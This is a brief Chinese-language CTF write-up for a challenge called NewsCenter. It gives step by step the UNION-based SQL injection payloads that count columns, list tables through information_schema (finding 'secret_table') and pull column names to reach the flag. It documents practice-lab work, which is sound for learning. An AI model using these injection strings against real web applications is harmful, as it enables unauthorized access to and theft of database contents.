## 2021-9-2NewsCenter
#SQL注入 
![[../attaches/Pasted image 20210902002713.png]]
尝试单引号后显示错误界面即存在注入点
1. 测列数
`1' and 0 union select 1,2,3 # `分别尝试1，2，3前两个报错，第三个成功显示
![[../attaches/Pasted image 20210902002955.png]]
即共有三列
2. 爆表名
`1' and 0 union select 1,TABLE_SCHEMA,TABLE_NAME from INFORMATION_SCHEMA.COLUMNS # `
![[../attaches/Pasted image 20210902004030.png]]
得到表名secret_table
3. 爆列名
`1' and 0 union select 1,column_name,data_type from information_schema.columns where table_name='secret_table'# `
![[../attaches/Pasted image 20210902004515.png]]
4. 拿flag

1' and 0 union select 1,column_name,column_name from information_schema.columns where table_name='flag'#